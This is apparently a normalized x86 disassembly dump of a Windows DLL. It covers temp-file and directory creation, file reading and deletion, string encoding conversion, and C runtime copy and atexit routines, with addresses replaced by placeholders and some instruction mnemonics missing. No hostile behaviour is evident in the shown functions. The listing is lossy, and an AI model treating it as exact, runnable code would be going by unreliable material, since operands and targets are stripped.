cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ ebp - 0x428 ]
push ecx
push 0x0
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ GetTempFileNameW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov esi [ rw-data ]
lea eax [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] 0x8
cmovae eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x21c ]
push 0x105
push eax
call sub_1003d941
push esi
lea eax [ ebp - 0x21c ]
push 0x105
push eax
call sub_1003d941
add esp 0x18
lea eax [ ebp - 0x21c ]
push 0x0
push eax
call [ CreateDirectoryW@IAT ]
mov ecx 0xd
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
lea eax [ ebp - 0x428 ]
lea esi [ edi + 0x1c ]
push eax
mov ecx esi
call sub_100093d0
cmp [ edi + 0x2c ] 0x0
jbe r-xdata
mov esi 0x1
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push esi
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
mov esi [ esi ]
call [ GetLastError@IAT ]
sub_1003be00
push ebp
mov ebp esp
push 0xffffffff
push sub_100536ad
mov eax [ fs : 0x0 ]
push eax
mov eax 0x2c18
call sub_10048ab0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
add ecx 0x1c
mov [ ebp - 0x2c20 ] 0x0
mov [ ebp - 0x2c24 ] edi
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push ecx
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ ecx ]
mov [ ebp - 0x2c08 ] 0x0
mov [ ebp - 0x2c04 ] 0x0
mov [ ebp - 0x2c04 ] 0xf
mov [ ebp - 0x2c08 ] 0x0
mov [ ebp - 0x2c18 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x2c08 ]
cmp ecx 0xc0138d
jae r-xdata
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x2c20 ] 0x1
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x2c18 ]
mov ecx edi
push eax
call sub_10004f60
mov [ ebp - 0x2c20 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x2c04 ] 0x10
jb r-xdata
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x2c04 ] 0xf
mov [ ebp - 0x2c08 ] 0x0
mov [ ebp - 0x2c18 ] 0x0
push [ ebp - 0x2c18 ]
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ ecx + 0x2bf0 ]
mov esi 0x2bf0
cmp eax 0xc0138d
jbe r-xdata
push 0x0
lea eax [ ebp - 0x2c1c ]
mov [ ebp - 0x2c1c ] 0x0
push eax
push esi
lea eax [ ebp - 0x2c00 ]
push eax
push ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov esi 0xc0138d
sub esi ecx
push [ ebp - 0x2c1c ]
lea eax [ ebp - 0x2c00 ]
push eax
lea ecx [ ebp - 0x2c18 ]
call sub_10005470
cmp [ ebp - 0x2c1c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c08 ]
cmp ecx 0xc0138d
jb r-xdata
sub_1003bfd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10053701
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp + 0x8 ]
push 0x0
call sub_1003c2d0
add esp 0x4
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003c060
push ebp
mov ebp esp
push 0xffffffff
push sub_10053701
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp + 0x8 ]
push 0x1
call sub_1003c2d0
add esp 0x4
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003c0f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10053749
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
sub esp 0x18
mov ecx esp
mov [ ebp - 0x18 ] esp
lea eax [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x1
mov ecx esi
call sub_1003bfd0
add esp 0x18
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003c1b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10053791
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp + 0x8 ]
push ecx
call sub_1003c3b0
add esp 0x4
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003c240
push ebp
mov ebp esp
push 0xffffffff
push sub_10053701
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea edx [ ebp + 0x8 ]
push 0xfde9
call sub_1003c2d0
add esp 0x4
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1003c2d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100537c9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov edi ecx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x0
xor ecx ecx
mov [ ebp - 0x14 ] 0x0
mov edx 0x2
mov eax [ esi + 0x10 ]
lea eax [ eax * 2 + 0x1 ]
mov [ ebp - 0x10 ] eax
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1003c61a
push [ ebp - 0x10 ]
mov ebx eax
push 0x0
push ebx
call sub_10045ec0
mov ecx [ esi + 0x10 ]
add esp 0x10
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x10 ]
dec eax
push eax
push ebx
push ecx
push esi
push 0x0
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push eax
mov [ edi ] cx
mov ecx edi
push ebx
call sub_10009730
mov [ ebp - 0x4 ] 0x0
push ebx
mov [ ebp - 0x14 ] 0x1
call j_sub_1003f3e3
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ esi ]
sub_1003c3b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10053809
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov edi ecx
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov eax [ esi + 0x10 ]
lea eax [ eax * 4 + 0x1 ]
push eax
mov [ ebp - 0x10 ] eax
call sub_1003c61a
push [ ebp - 0x10 ]
mov ebx eax
push 0x0
push ebx
call sub_10045ec0
mov ecx [ esi + 0x10 ]
add esp 0x10
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp - 0x10 ]
push 0x0
push 0x0
dec eax
push eax
push ebx
push ecx
push esi
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
push eax
mov [ edi + 0x14 ] 0xf
mov ecx edi
mov [ edi + 0x10 ] 0x0
push ebx
mov [ edi ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
push ebx
mov [ ebp - 0x14 ] 0x1
call j_sub_1003f3e3
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ esi ]
sub_1003c479
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_1003c4a3
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_1003c549
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e905
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
pop ecx
sub_1003c56e
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003e905
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
pop ecx
sub_1003c58d
push ebp
mov ebp esp
sub esp 0x10
push 0x1
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] r--data
push eax
lea ecx [ ebp - 0x10 ]
call sub_1003e8c7
push r--data
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] r--data
push eax
call sub_1003e35b
int3
sub_1003c5be
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1003e8a2
push r--data
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] r--data
push eax
call sub_1003e35b
int3
sub_1003c5ec
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_1003e8a2
push r--data
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] r--data
push eax
call sub_1003e35b
int3
sub_1003c640
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_1003cb14 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1003ca18 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003cb14 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1003c88c ]
jmp [ ecx * 4 + jump_table_1003c90c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003c978 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1003cb14 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1003c978 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003cb14 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003cb14 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1003cb14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003c978 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003c978 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1003c978 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_1003c978 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_1003cc84
push esi
push 0x4
push 0x20
call sub_1003f09c
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1003ccb3
push 0xc
push r--data
call sub_1003f180
and [ ebp - 0x1c ] 0x0
call sub_1003ef2a
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1003ccf7
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003ccf1
mov eax esi
call sub_1003f1c5
retn
sub_1003ccf7
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_1003f06b
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
mov [ ebx ] eax
push ecx
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_1003f12b
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_1003f12b
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_1003cdeb
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1003fc06
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1003fc98
pop ecx
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
push 0x1
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] r--data
push eax
lea ecx [ ebp - 0x10 ]
call sub_1003e8c7
push r--data
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] r--data
push eax
call sub_1003e35b
int3
sub_1003ce41
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
xor eax eax
push edi
lea edi [ ebp - 0x1c ]
push 0x7
pop ecx
[ edi ]
cmp [ ebp + 0x14 ] eax
jne r-xdata
mov edi [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp esi eax
ja r-xdata
test edi edi
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x18 ]
mov [ ebp - 0x18 ] edi
push [ ebp + 0x14 ]
mov [ ebp - 0x20 ] edi
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov ebx eax
test edi edi
je r-xdata
mov [ ebp - 0x1c ] esi
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
jmp r-xdata
pop ebx
test ebx ebx
js r-xdata
pop esi
xor eax eax
mov [ edi + esi - 0x1 ] 0x0
cmp [ ebp - 0x1c ] eax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1003fe63
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_1003cf0b
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
pop ebp
retn
call sub_100417ee
mov [ eax ] 0x16
